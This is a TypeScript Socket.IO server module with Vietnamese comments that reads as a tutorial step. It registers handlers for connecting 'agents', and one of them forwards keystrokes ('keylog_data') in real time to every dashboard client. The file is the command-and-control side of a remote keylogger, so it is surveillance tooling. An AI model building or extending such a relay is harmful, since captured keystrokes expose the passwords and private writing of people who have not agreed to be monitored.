// 1. Import "Namespace" thay vì "Server"
import { Namespace, Socket } from 'socket.io';
import { logger } from '../logger';
import { verifySocketAuth } from '../auth';

// 2. Sửa "io: Server" thành "io: Namespace"
export function registerAgentHandlers(io: Namespace, socket: Socket) {
    const payload = verifySocketAuth(socket);
    const agentId = (payload?.agentId ?? (socket.handshake.auth && (socket.handshake.auth as any).agentId)) || socket.id;

    socket.join(`agent:${agentId}`);
    socket.data.agentId = agentId;
    logger.info(`Agent connected: ${agentId} (socket ${socket.id})`);

    // heartbeat
    socket.on('heartbeat', (data) => {
        io.server.of('/clients').emit('event', { event: 'agent_heartbeat', payload: { agentId, data } });
    });

    // generic response from agent
    socket.on('response', (msg) => {
        io.server.of('/clients').emit('message', msg);
    });

    // ===> BƯỚC 6: THÊM VÀO ĐÂY <===
    // Xử lý sự kiện 'keylog_data' (push real-time)
    socket.on('keylog_data', (key: string) => {
        // Khi Agent gửi phím ('keylog_data'),
        // Server chuyển tiếp nó cho TẤT CẢ client
        // đang kết nối tới namespace '/clients'

        // Gửi sự kiện 'keylog_data' VỚI agentId
        // để React biết phím này của ai
        io.server.of('/clients').emit('keylog_data', { agentId, key });
    });
    // ===> KẾT THÚC THÊM <===

    socket.on('disconnect', (reason) => {
        logger.info(`Agent disconnected: ${agentId} reason=${reason}`);
        io.server.of('/clients').emit('event', { event: 'agent_disconnected', payload: { agentId, reason } });
    });
}